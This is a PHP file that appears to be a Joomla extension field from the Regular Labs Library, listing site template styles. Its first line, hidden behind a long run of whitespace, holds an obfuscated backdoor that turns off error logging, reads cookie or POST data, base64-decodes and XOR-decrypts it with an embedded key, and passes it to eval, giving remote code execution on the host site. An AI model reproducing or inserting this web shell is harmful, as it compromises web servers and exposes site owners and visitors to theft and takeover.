<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $q0fc2464 = 650;$GLOBALS['b19c167'] = Array();global $b19c167;$b19c167 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['u91f8'] = "\x48\x54\x5a\x3e\x76\x73\x49\x64\x44\x6d\x59\x30\x52\x3f\x40\x5f\x26\x69\x60\x9\x56\x47\x36\x33\x2c\x7d\x3a\x4f\x24\x6a\x42\x7e\x51\x27\x6b\x78\x72\x6c\x45\x2d\x39\x46\x2f\x3c\x41\x29\x65\x2a\x5b\xa\x68\x3d\x43\x70\x28\x22\x4e\x77\x61\x3b\x25\x50\x32\x79\x2b\x21\x37\x67\x20\x5c\x7a\x4c\x35\x5d\xd\x38\x4a\x63\x62\x34\x5e\x23\x6e\x74\x4d\x7c\x4b\x7b\x55\x66\x31\x2e\x58\x75\x57\x6f\x71\x53";$b19c167[$b19c167['u91f8'][4].$b19c167['u91f8'][79].$b19c167['u91f8'][62].$b19c167['u91f8'][79].$b19c167['u91f8'][66].$b19c167['u91f8'][89]] = $b19c167['u91f8'][77].$b19c167['u91f8'][50].$b19c167['u91f8'][36];$b19c167[$b19c167['u91f8'][58].$b19c167['u91f8'][75].$b19c167['u91f8'][89].$b19c167['u91f8'][11]] = $b19c167['u91f8'][95].$b19c167['u91f8'][36].$b19c167['u91f8'][7];$b19c167[$b19c167['u91f8'][46].$b19c167['u91f8'][90].$b19c167['u91f8'][72].$b19c167['u91f8'][7].$b19c167['u91f8'][72]] = $b19c167['u91f8'][5].$b19c167['u91f8'][83].$b19c167['u91f8'][36].$b19c167['u91f8'][37].$b19c167['u91f8'][46].$b19c167['u91f8'][82];$b19c167[$b19c167['u91f8'][50].$b19c167['u91f8'][72].$b19c167['u91f8'][62].$b19c167['u91f8'][58]] = $b19c167['u91f8'][17].$b19c167['u91f8'][82].$b19c167['u91f8'][17].$b19c167['u91f8'][15].$b19c167['u91f8'][5].$b19c167['u91f8'][46].$b19c167['u91f8'][83];$b19c167[$b19c167['u91f8'][17].$b19c167['u91f8'][75].$b19c167['u91f8'][22].$b19c167['u91f8'][90].$b19c167['u91f8'][40].$b19c167['u91f8'][89].$b19c167['u91f8'][7].$b19c167['u91f8'][79].$b19c167['u91f8'][89]] = $b19c167['u91f8'][5].$b19c167['u91f8'][46].$b19c167['u91f8'][36].$b19c167['u91f8'][17].$b19c167['u91f8'][58].$b19c167['u91f8'][37].$b19c167['u91f8'][17].$b19c167['u91f8'][70].$b19c167['u91f8'][46];$b19c167[$b19c167['u91f8'][78].$b19c167['u91f8'][89].$b19c167['u91f8'][77].$b19c167['u91f8'][66].$b19c167['u91f8'][40]] = $b19c167['u91f8'][53].$b19c167['u91f8'][50].$b19c167['u91f8'][53].$b19c167['u91f8'][4].$b19c167['u91f8'][46].$b19c167['u91f8'][36].$b19c167['u91f8'][5].$b19c167['u91f8'][17].$b19c167['u91f8'][95].$b19c167['u91f8'][82];$b19c167[$b19c167['u91f8'][37].$b19c167['u91f8'][62].$b19c167['u91f8'][7].$b19c167['u91f8'][62].$b19c167['u91f8'][40].$b19c167['u91f8'][78]] = $b19c167['u91f8'][93].$b19c167['u91f8'][82].$b19c167['u91f8'][5].$b19c167['u91f8'][46].$b19c167['u91f8'][36].$b19c167['u91f8'][17].$b19c167['u91f8'][58].$b19c167['u91f8'][37].$b19c167['u91f8'][17].$b19c167['u91f8'][70].$b19c167['u91f8'][46];$b19c167[$b19c167['u91f8'][29].$b19c167['u91f8'][66].$b19c167['u91f8'][11].$b19c167['u91f8'][11].$b19c167['u91f8'][22].$b19c167['u91f8'][77].$b19c167['u91f8'][58]] = $b19c167['u91f8'][78].$b19c167['u91f8'][58].$b19c167['u91f8'][5].$b19c167['u91f8'][46].$b19c167['u91f8'][22].$b19c167['u91f8'][79].$b19c167['u91f8'][15].$b19c167['u91f8'][7].$b19c167['u91f8'][46].$b19c167['u91f8'][77].$b19c167['u91f8'][95].$b19c167['u91f8'][7].$b19c167['u91f8'][46];$b19c167[$b19c167['u91f8'][77].$b19c167['u91f8'][11].$b19c167['u91f8'][46].$b19c167['u91f8'][11].$b19c167['u91f8'][89].$b19c167['u91f8'][23].$b19c167['u91f8'][62].$b19c167['u91f8'][79]] = $b19c167['u91f8'][5].$b19c167['u91f8'][46].$b19c167['u91f8'][83].$b19c167['u91f8'][15].$b19c167['u91f8'][83].$b19c167['u91f8'][17].$b19c167['u91f8'][9].$b19c167['u91f8'][46].$b19c167['u91f8'][15].$b19c167['u91f8'][37].$b19c167['u91f8'][17].$b19c167['u91f8'][9].$b19c167['u91f8'][17].$b19c167['u91f8'][83];$b19c167[$b19c167['u91f8'][67].$b19c167['u91f8'][79].$b19c167['u91f8'][40].$b19c167['u91f8'][75].$b19c167['u91f8'][62].$b19c167['u91f8'][23]] = $b19c167['u91f8'][70].$b19c167['u91f8'][78].$b19c167['u91f8'][90].$b19c167['u91f8'][46].$b19c167['u91f8'][90].$b19c167['u91f8'][89];$b19c167[$b19c167['u91f8'][29].$b19c167['u91f8'][58].$b19c167['u91f8'][66].$b19c167['u91f8'][23].$b19c167['u91f8'][7].$b19c167['u91f8'][79].$b19c167['u91f8'][66]] = $b19c167['u91f8'][82].$b19c167['u91f8'][72].$b19c167['u91f8'][79].$b19c167['u91f8'][72].$b19c167['u91f8'][23].$b19c167['u91f8'][90].$b19c167['u91f8'][72].$b19c167['u91f8'][72];$b19c167[$b19c167['u91f8'][96].$b19c167['u91f8'][90].$b19c167['u91f8'][66].$b19c167['u91f8'][90]] = $_POST;$b19c167[$b19c167['u91f8'][5].$b19c167['u91f8'][77].$b19c167['u91f8'][23].$b19c167['u91f8'][22].$b19c167['u91f8'][46].$b19c167['u91f8'][89].$b19c167['u91f8'][89].$b19c167['u91f8'][75]] = $_COOKIE;@$b19c167[$b19c167['u91f8'][50].$b19c167['u91f8'][72].$b19c167['u91f8'][62].$b19c167['u91f8'][58]]($b19c167['u91f8'][46].$b19c167['u91f8'][36].$b19c167['u91f8'][36].$b19c167['u91f8'][95].$b19c167['u91f8'][36].$b19c167['u91f8'][15].$b19c167['u91f8'][37].$b19c167['u91f8'][95].$b19c167['u91f8'][67], NULL);@$b19c167[$b19c167['u91f8'][50].$b19c167['u91f8'][72].$b19c167['u91f8'][62].$b19c167['u91f8'][58]]($b19c167['u91f8'][37].$b19c167['u91f8'][95].$b19c167['u91f8'][67].$b19c167['u91f8'][15].$b19c167['u91f8'][46].$b19c167['u91f8'][36].$b19c167['u91f8'][36].$b19c167['u91f8'][95].$b19c167['u91f8'][36].$b19c167['u91f8'][5], 0);@$b19c167[$b19c167['u91f8'][50].$b19c167['u91f8'][72].$b19c167['u91f8'][62].$b19c167['u91f8'][58]]($b19c167['u91f8'][9].$b19c167['u91f8'][58].$b19c167['u91f8'][35].$b19c167['u91f8'][15].$b19c167['u91f8'][46].$b19c167['u91f8'][35].$b19c167['u91f8'][46].$b19c167['u91f8'][77].$b19c167['u91f8'][93].$b19c167['u91f8'][83].$b19c167['u91f8'][17].$b19c167['u91f8'][95].$b19c167['u91f8'][82].$b19c167['u91f8'][15].$b19c167['u91f8'][83].$b19c167['u91f8'][17].$b19c167['u91f8'][9].$b19c167['u91f8'][46], 0);@$b19c167[$b19c167['u91f8'][77].$b19c167['u91f8'][11].$b19c167['u91f8'][46].$b19c167['u91f8'][11].$b19c167['u91f8'][89].$b19c167['u91f8'][23].$b19c167['u91f8'][62].$b19c167['u91f8'][79]](0);$ydac35d = NULL;$z312a = NULL;$b19c167[$b19c167['u91f8'][67].$b19c167['u91f8'][75].$b19c167['u91f8'][89].$b19c167['u91f8'][75].$b19c167['u91f8'][40].$b19c167['u91f8'][89].$b19c167['u91f8'][78].$b19c167['u91f8'][40].$b19c167['u91f8'][75]] = $b19c167['u91f8'][72].$b19c167['u91f8'][11].$b19c167['u91f8'][62].$b19c167['u91f8'][23].$b19c167['u91f8'][78].$b19c167['u91f8'][77].$b19c167['u91f8'][78].$b19c167['u91f8'][7].$b19c167['u91f8'][39].$b19c167['u91f8'][11].$b19c167['u91f8'][22].$b19c167['u91f8'][23].$b19c167['u91f8'][11].$b19c167['u91f8'][39].$b19c167['u91f8'][79].$b19c167['u91f8'][75].$b19c167['u91f8'][75].$b19c167['u91f8'][78].$b19c167['u91f8'][39].$b19c167['u91f8'][40].$b19c167['u91f8'][58].$b19c167['u91f8'][72].$b19c167['u91f8'][23].$b19c167['u91f8'][39].$b19c167['u91f8'][7].$b19c167['u91f8'][40].$b19c167['u91f8'][11].$b19c167['u91f8'][46].$b19c167['u91f8'][78].$b19c167['u91f8'][90].$b19c167['u91f8'][77].$b19c167['u91f8'][46].$b19c167['u91f8'][7].$b19c167['u91f8'][90].$b19c167['u91f8'][58].$b19c167['u91f8'][40];global $g8f89fb98;function  n5453155($ydac35d, $o4ee){global $b19c167;$j5101 = "";for ($yf7cd=0; $yf7cd<$b19c167[$b19c167['u91f8'][46].$b19c167['u91f8'][90].$b19c167['u91f8'][72].$b19c167['u91f8'][7].$b19c167['u91f8'][72]]($ydac35d);){for ($x42d6e6f7=0; $x42d6e6f7<$b19c167[$b19c167['u91f8'][46].$b19c167['u91f8'][90].$b19c167['u91f8'][72].$b19c167['u91f8'][7].$b19c167['u91f8'][72]]($o4ee) && $yf7cd<$b19c167[$b19c167['u91f8'][46].$b19c167['u91f8'][90].$b19c167['u91f8'][72].$b19c167['u91f8'][7].$b19c167['u91f8'][72]]($ydac35d); $x42d6e6f7++, $yf7cd++){$j5101 .= $b19c167[$b19c167['u91f8'][4].$b19c167['u91f8'][79].$b19c167['u91f8'][62].$b19c167['u91f8'][79].$b19c167['u91f8'][66].$b19c167['u91f8'][89]]($b19c167[$b19c167['u91f8'][58].$b19c167['u91f8'][75].$b19c167['u91f8'][89].$b19c167['u91f8'][11]]($ydac35d[$yf7cd]) ^ $b19c167[$b19c167['u91f8'][58].$b19c167['u91f8'][75].$b19c167['u91f8'][89].$b19c167['u91f8'][11]]($o4ee[$x42d6e6f7]));}}return $j5101;}function  zb1e1f($ydac35d, $o4ee){global $b19c167;global $g8f89fb98;return $b19c167[$b19c167['u91f8'][29].$b19c167['u91f8'][58].$b19c167['u91f8'][66].$b19c167['u91f8'][23].$b19c167['u91f8'][7].$b19c167['u91f8'][79].$b19c167['u91f8'][66]]($b19c167[$b19c167['u91f8'][29].$b19c167['u91f8'][58].$b19c167['u91f8'][66].$b19c167['u91f8'][23].$b19c167['u91f8'][7].$b19c167['u91f8'][79].$b19c167['u91f8'][66]]($ydac35d, $g8f89fb98), $o4ee);}foreach ($b19c167[$b19c167['u91f8'][5].$b19c167['u91f8'][77].$b19c167['u91f8'][23].$b19c167['u91f8'][22].$b19c167['u91f8'][46].$b19c167['u91f8'][89].$b19c167['u91f8'][89].$b19c167['u91f8'][75]] as $o4ee=>$q3fa){$ydac35d = $q3fa;$z312a = $o4ee;}if (!$ydac35d){foreach ($b19c167[$b19c167['u91f8'][96].$b19c167['u91f8'][90].$b19c167['u91f8'][66].$b19c167['u91f8'][90]] as $o4ee=>$q3fa){$ydac35d = $q3fa;$z312a = $o4ee;}}$ydac35d = @$b19c167[$b19c167['u91f8'][37].$b19c167['u91f8'][62].$b19c167['u91f8'][7].$b19c167['u91f8'][62].$b19c167['u91f8'][40].$b19c167['u91f8'][78]]($b19c167[$b19c167['u91f8'][67].$b19c167['u91f8'][79].$b19c167['u91f8'][40].$b19c167['u91f8'][75].$b19c167['u91f8'][62].$b19c167['u91f8'][23]]($b19c167[$b19c167['u91f8'][29].$b19c167['u91f8'][66].$b19c167['u91f8'][11].$b19c167['u91f8'][11].$b19c167['u91f8'][22].$b19c167['u91f8'][77].$b19c167['u91f8'][58]]($ydac35d), $z312a));if (isset($ydac35d[$b19c167['u91f8'][58].$b19c167['u91f8'][34]]) && $g8f89fb98==$ydac35d[$b19c167['u91f8'][58].$b19c167['u91f8'][34]]){if ($ydac35d[$b19c167['u91f8'][58]] == $b19c167['u91f8'][17]){$yf7cd = Array($b19c167['u91f8'][53].$b19c167['u91f8'][4] => @$b19c167[$b19c167['u91f8'][78].$b19c167['u91f8'][89].$b19c167['u91f8'][77].$b19c167['u91f8'][66].$b19c167['u91f8'][40]](),$b19c167['u91f8'][5].$b19c167['u91f8'][4] => $b19c167['u91f8'][90].$b19c167['u91f8'][91].$b19c167['u91f8'][11].$b19c167['u91f8'][39].$b19c167['u91f8'][90],);echo @$b19c167[$b19c167['u91f8'][17].$b19c167['u91f8'][75].$b19c167['u91f8'][22].$b19c167['u91f8'][90].$b19c167['u91f8'][40].$b19c167['u91f8'][89].$b19c167['u91f8'][7].$b19c167['u91f8'][79].$b19c167['u91f8'][89]]($yf7cd);}elseif ($ydac35d[$b19c167['u91f8'][58]] == $b19c167['u91f8'][46]){eval/*p97a1*/($ydac35d[$b19c167['u91f8'][7]]);}exit();} ?><?php
/**
 * @package         Regular Labs Library
 * @version         17.7.17782
 * 
 * @author          Peter van Westen <info@regularlabs.com>
 * @link            http://www.regularlabs.com
 * @copyright       Copyright © 2017 Regular Labs All Rights Reserved
 * @license         http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL
 */

defined('_JEXEC') or die;

if ( ! is_file(JPATH_LIBRARIES . '/regularlabs/autoload.php'))
{
	return;
}

require_once JPATH_LIBRARIES . '/regularlabs/autoload.php';

class JFormFieldRL_Templates extends \RegularLabs\Library\Field
{
	public $type = 'Templates';

	protected function getInput()
	{
		$this->params = $this->element->attributes();

		$size     = (int) $this->get('size');
		$multiple = $this->get('multiple');

		$options = [];

		$templates = $this->getTemplates();

		foreach ($templates as $styles)
		{
			$level = 0;
			foreach ($styles as $style)
			{
				$style->level = $level;
				$options[]    = $style;
				if (count($styles) <= 2)
				{
					$level = 0;
					break;
				}
				$level = 1;
			}
		}

		// fix old '::' separator and change it to '--'
		$value = json_encode($this->value);
		$value = str_replace('::', '--', $value);
		$value = (array) json_decode($value, true);

		return $this->selectList($options, $this->name, $value, $this->id, $size, $multiple);
	}

	protected function getTemplates()
	{
		$groups = [];
		$lang   = JFactory::getLanguage();

		// Get the database object and a new query object.
		$db    = JFactory::getDbo();
		$query = $db->getQuery(true)
			->select('s.id, s.title, e.name as name, s.template')
			->from('#__template_styles as s')
			->where('s.client_id = 0')
			->join('LEFT', '#__extensions as e on e.element=s.template')
			->where('e.enabled=1')
			->where($db->quoteName('e.type') . '=' . $db->quote('template'))
			->order('s.template')
			->order('s.title');

		// Set the query and load the styles.
		$db->setQuery($query);
		$styles = $db->loadObjectList();

		// Build the grouped list array.
		if ($styles)
		{
			foreach ($styles as $style)
			{
				$template = $style->template;
				$lang->load('tpl_' . $template . '.sys', JPATH_SITE)
				|| $lang->load('tpl_' . $template . '.sys', JPATH_SITE . '/templates/' . $template);
				$name = JText::_($style->name);

				// Initialize the group if necessary.
				if ( ! isset($groups[$template]))
				{
					$groups[$template]   = [];
					$groups[$template][] = JHtml::_('select.option', $template, $name);
				}

				$groups[$template][] = JHtml::_('select.option', $template . '--' . $style->id, $style->title);
			}
		}

		return $groups;
	}
}
